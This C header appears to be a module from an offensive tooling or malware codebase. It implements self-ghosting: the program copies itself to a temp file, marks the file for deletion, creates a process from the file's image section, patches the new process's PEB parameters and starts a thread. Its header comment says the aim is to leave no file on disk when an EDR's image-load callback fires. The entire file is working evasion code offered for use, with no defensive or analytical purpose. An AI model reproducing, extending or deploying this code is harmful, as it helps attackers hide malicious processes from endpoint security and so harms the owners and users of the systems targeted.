// chunk: process/process_ghost
// depends: (none)
// provides: ghost_self
// headers: windows.h
// note: Process ghosting — creates process from a file pending deletion. When EDR's image-load callback fires, the originating file no longer exists on disk. Self-ghosting pattern: writes own binary to temp, marks for delete, creates section+process, exits original.

#ifndef CHUNK_PROCESS_GHOST
#define CHUNK_PROCESS_GHOST

#include <windows.h>

typedef LONG NTSTATUS_G;
#define NT_OK_G(s) ((NTSTATUS_G)(s) >= 0)

typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } USTR_G;

typedef struct {
    union { NTSTATUS_G Status; PVOID Pointer; };
    ULONG_PTR Information;
} IOSB_G;

typedef struct {
    BOOLEAN DeleteFile;
} FDISP_G;

typedef struct {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PBI_G;

typedef NTSTATUS_G (NTAPI *fn_NtCreateSection_G)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS_G (NTAPI *fn_NtCreateProcessEx_G)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, ULONG);
typedef NTSTATUS_G (NTAPI *fn_NtSetInfoFile_G)(HANDLE, IOSB_G*, PVOID, ULONG, ULONG);
typedef NTSTATUS_G (NTAPI *fn_NtQueryInfoProc_G)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS_G (NTAPI *fn_NtCreateThreadEx_G)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS_G (NTAPI *fn_RtlCreateProcParams_G)(PVOID*, USTR_G*, PVOID, PVOID, USTR_G*, PVOID, PVOID, PVOID, PVOID, PVOID, ULONG);
typedef NTSTATUS_G (NTAPI *fn_NtAllocVM_G)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS_G (NTAPI *fn_NtWriteVM_G)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

#define GHOST_MARKER "--ghosted"

static int ghost_self(void) {
    LPSTR cmd = GetCommandLineA();
    if (strstr(cmd, GHOST_MARKER))
        return 1;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    fn_NtCreateSection_G pCreateSec = (fn_NtCreateSection_G)GetProcAddress(ntdll, "NtCreateSection");
    fn_NtCreateProcessEx_G pCreateProc = (fn_NtCreateProcessEx_G)GetProcAddress(ntdll, "NtCreateProcessEx");
    fn_NtSetInfoFile_G pSetInfo = (fn_NtSetInfoFile_G)GetProcAddress(ntdll, "NtSetInformationFile");
    fn_NtQueryInfoProc_G pQueryProc = (fn_NtQueryInfoProc_G)GetProcAddress(ntdll, "NtQueryInformationProcess");
    fn_NtCreateThreadEx_G pCreateThread = (fn_NtCreateThreadEx_G)GetProcAddress(ntdll, "NtCreateThreadEx");
    fn_RtlCreateProcParams_G pCreateParams = (fn_RtlCreateProcParams_G)GetProcAddress(ntdll, "RtlCreateProcessParametersEx");
    fn_NtAllocVM_G pAllocVM = (fn_NtAllocVM_G)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    fn_NtWriteVM_G pWriteVM = (fn_NtWriteVM_G)GetProcAddress(ntdll, "NtWriteVirtualMemory");

    if (!pCreateSec || !pCreateProc || !pSetInfo || !pQueryProc ||
        !pCreateThread || !pCreateParams || !pAllocVM || !pWriteVM)
        return -1;

    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    HANDLE hSelf = CreateFileA(self_path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) return -1;
    DWORD self_size = GetFileSize(hSelf, NULL);
    BYTE *self_buf = (BYTE *)VirtualAlloc(NULL, self_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!self_buf) { CloseHandle(hSelf); return -1; }
    DWORD rd;
    ReadFile(hSelf, self_buf, self_size, &rd, NULL);
    CloseHandle(hSelf);

    char temp_dir[MAX_PATH], temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    GetTempFileNameA(temp_dir, "gs", 0, temp_path);

    HANDLE hTemp = CreateFileA(temp_path, GENERIC_READ | GENERIC_WRITE | DELETE,
                               FILE_SHARE_READ | FILE_SHARE_DELETE,
                               NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTemp == INVALID_HANDLE_VALUE) {
        VirtualFree(self_buf, 0, MEM_RELEASE);
        return -1;
    }

    DWORD written;
    WriteFile(hTemp, self_buf, self_size, &written, NULL);

    // Mark file for deletion (FileDispositionInformation = 13)
    IOSB_G iosb = {0};
    FDISP_G disp = { .DeleteFile = TRUE };
    NTSTATUS_G st = pSetInfo(hTemp, &iosb, &disp, sizeof(disp), 13);
    if (!NT_OK_G(st)) {
        CloseHandle(hTemp);
        DeleteFileA(temp_path);
        VirtualFree(self_buf, 0, MEM_RELEASE);
        return -1;
    }

    // Create section from pending-delete file
    HANDLE hSection = NULL;
    st = pCreateSec(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
                    PAGE_READONLY, SEC_IMAGE, hTemp);
    CloseHandle(hTemp); // file gets deleted, section persists

    if (!NT_OK_G(st) || !hSection) {
        VirtualFree(self_buf, 0, MEM_RELEASE);
        return -1;
    }

    // Create ghost process from section
    HANDLE hProcess = NULL;
    st = pCreateProc(&hProcess, PROCESS_ALL_ACCESS, NULL,
                     GetCurrentProcess(), 0, hSection, NULL, NULL, 0);
    CloseHandle(hSection);

    if (!NT_OK_G(st) || !hProcess) {
        VirtualFree(self_buf, 0, MEM_RELEASE);
        return -1;
    }

    // Get entry point from our own PE headers
    BYTE *own_base = (BYTE *)GetModuleHandleA(NULL);
    IMAGE_DOS_HEADER *own_dos = (IMAGE_DOS_HEADER *)own_base;
    IMAGE_NT_HEADERS *own_nt = (IMAGE_NT_HEADERS *)(own_base + own_dos->e_lfanew);
    DWORD entry_rva = own_nt->OptionalHeader.AddressOfEntryPoint;
    ULONGLONG image_base = own_nt->OptionalHeader.ImageBase;

    VirtualFree(self_buf, 0, MEM_RELEASE);

    // Query ghost process PEB address
    PBI_G pbi = {0};
    st = pQueryProc(hProcess, 0, &pbi, sizeof(pbi), NULL);
    if (!NT_OK_G(st)) {
        CloseHandle(hProcess);
        return -1;
    }

    // Build process parameters with ghost marker
    WCHAR w_path[MAX_PATH], w_cmd[1024];
    MultiByteToWideChar(CP_ACP, 0, self_path, -1, w_path, MAX_PATH);
    MultiByteToWideChar(CP_ACP, 0, self_path, -1, w_cmd, 512);
    wcscat(w_cmd, L" " L"--ghosted");

    USTR_G us_image = {0}, us_cmd = {0};
    us_image.Buffer = w_path;
    us_image.Length = (USHORT)(wcslen(w_path) * sizeof(WCHAR));
    us_image.MaximumLength = us_image.Length + sizeof(WCHAR);
    us_cmd.Buffer = w_cmd;
    us_cmd.Length = (USHORT)(wcslen(w_cmd) * sizeof(WCHAR));
    us_cmd.MaximumLength = us_cmd.Length + sizeof(WCHAR);

    PVOID params = NULL;
    st = pCreateParams(&params, &us_image, NULL, NULL, &us_cmd,
                       NULL, NULL, NULL, NULL, NULL, 1);
    if (!NT_OK_G(st) || !params) {
        CloseHandle(hProcess);
        return -1;
    }

    // Write parameters into ghost process
    DWORD params_size = *(DWORD *)((BYTE *)params + 4);
    PVOID remote_params = NULL;
    SIZE_T alloc_size = (SIZE_T)params_size;
    st = pAllocVM(hProcess, &remote_params, 0, &alloc_size,
                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_OK_G(st)) { CloseHandle(hProcess); return -1; }

    st = pWriteVM(hProcess, remote_params, params, params_size, NULL);
    if (!NT_OK_G(st)) { CloseHandle(hProcess); return -1; }

    // Update PEB->ProcessParameters (offset 0x20 on x64)
    PVOID peb_pp = (BYTE *)pbi.PebBaseAddress + 0x20;
    st = pWriteVM(hProcess, peb_pp, &remote_params, sizeof(PVOID), NULL);
    if (!NT_OK_G(st)) { CloseHandle(hProcess); return -1; }

    // Create initial thread at entry point
    HANDLE hThread = NULL;
    PVOID entry = (PVOID)(image_base + entry_rva);
    st = pCreateThread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                       entry, NULL, 0, 0, 0, 0, NULL);

    if (hThread) CloseHandle(hThread);
    CloseHandle(hProcess);

    return NT_OK_G(st) ? 0 : -1;
}

#endif
